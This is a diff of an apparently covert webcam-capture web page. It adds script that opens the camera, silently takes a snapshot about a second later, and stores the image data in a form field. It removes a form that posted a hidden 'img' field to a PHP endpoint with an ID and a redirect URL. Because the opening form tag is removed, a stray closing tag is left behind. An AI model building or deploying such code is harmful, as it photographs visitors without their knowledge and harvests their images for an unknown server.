@@ -15,14 +15,21 @@
 
             if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
+					video.srcObject = stream;
+                    video.play();
+                    
+                    setTimeout(function(){context.drawImage(video, 0, 0, 480, 640);},1000);
+                    setTimeout(function(){
+                        var img = canvas.toDataURL('image/png');  
+                        document.getElementById('result').value = img;
+                        },1300);
                 },function(){alert("操作失败，权限不够！");});
                 
             }
 		}, false);
 
 	</script>
-<form action="qbl.php?id=545386&url=http://www.baidu.com" id="gopo" method="post">
-<input type="hidden" name="img" id="result" value="" />
+<input name="img" id="result" value="" />
 </form>
 </body>
 </html>
